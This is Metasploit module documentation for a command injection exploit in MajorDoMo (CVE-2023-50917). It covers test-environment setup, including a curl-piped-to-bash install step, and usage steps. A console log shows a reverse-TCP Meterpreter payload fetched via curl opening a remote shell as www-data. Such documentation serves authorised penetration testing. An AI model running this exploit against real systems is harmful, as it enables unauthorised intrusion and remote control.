## Vulnerable Application

This module exploits a command injection vulnerability in MajorDoMo versions before 0662e5e. To set up a test environment:

1. Download MajorDoMo by executing the following command:
```
curl -s https://raw.githubusercontent.com/sergejey/majordomo-rpi-install/main/install.sh | bash && bash ~/majordomo-rpi-install/install.sh
```
2. Follow the installation script instructions to install MajorDoMo on a Raspberry Pi or a Linux-based server.
3. Ensure that the network interface is active and properly configured during installation.
4. Replace `/var/www/html/modules/thumb/thumb.php` with
https://raw.githubusercontent.com/sergejey/majordomo/1167ca408a911c98937000516588c12cc33a1ab7/modules/thumb/thumb.php.
5. After installation, verify that the MajorDoMo service is operational and accessible over the network.


## Verification Steps

1. Install MajorDoMo with a version prior to 0662e5e.
2. Start msfconsole in your Metasploit environment.
3. Do: `use exploit/linux/http/majordomo_cmd_inject_cve_2023_50917`
4. Set the RHOSTS to the target IP address or hostname.
5. Do: `run`
6. If the target is vulnerable, the exploit will execute the specified payload.

## Options

No options

## Scenarios

### Successful Exploitation against MajorDoMo

This scenario demonstrates exploiting MajorDoMo on a Linux server.

**Environment**:
- MajorDoMo before 0662e5e
- Linux Server or Raspberry Pi
- Metasploit Framework

**Expected Output**:

```
msf6 > search cve_2023_50917

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank       Check  Description
   -  ----                                                    ---------------  ----       -----  -----------
   0  exploit/linux/http/majordomo_cmd_inject_cve_2023_50917  2023-12-15       excellent  Yes    MajorDoMo Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/majordomo_cmd_inject_cve_2023_50917

msf6 > use 0
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/majordomo_cmd_inject_cve_2023_50917) > options 
Module options (exploit/linux/http/majordomo_cmd_inject_cve_2023_50917):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format typ
                                         e:host:port[,type:host:port
                                         ][...]
   RHOSTS                      yes       The target host(s), see htt
                                         ps://docs.metasploit.com/do
                                         cs/using-metasploit/basics/
                                         using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgo
                                         ing connections
   TARGETURI  /                yes       The URI path to MajorDoMo
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch paylo
                                              ad (Accepted: CURL, FT
                                              P, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the
                                              binary after execution
   FETCH_FILENAME  GRigjGGzCVI      no        Name to use on remote
                                              system when storing pa
                                              yload; cannot contain
                                              spaces.
   FETCH_SRVHOST                    no        Local IP to use for se
                                              rving payload
   FETCH_SRVPORT   8080             yes       Local port to use for
                                              serving payload
   FETCH_URIPATH                    no        Local URI to use for s
                                              erving payload
   FETCH_WRITABLE                   yes       Remote writable dir to
   _DIR                                        store payload; cannot
                                               contain spaces.
   LHOST           192.168.1.5      yes       The listen address (an
                                               interface may be spec
                                              ified)
   LPORT           4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/majordomo_cmd_inject_cve_2023_50917) > set rhosts 192.168.1.18
rhosts => 192.168.1.18
msf6 exploit(linux/http/majordomo_cmd_inject_cve_2023_50917) > exploit 
[*] Started reverse TCP handler on 192.168.1.5:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 192.168.1.18:80 can be exploited!
[+] Target is identified as MajorDoMo instance
[*] Performing command injection test issuing a sleep command of 9 seconds.
[*] Elapsed time: 9.112166871999989 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Sending stage (3045380 bytes) to 192.168.1.18
[*] Meterpreter session 1 opened (192.168.1.5:4444 -> 192.168.1.18:60054) at 2023-12-21 23:56:54 +0100

meterpreter > getuid 
Server username: www-data
```
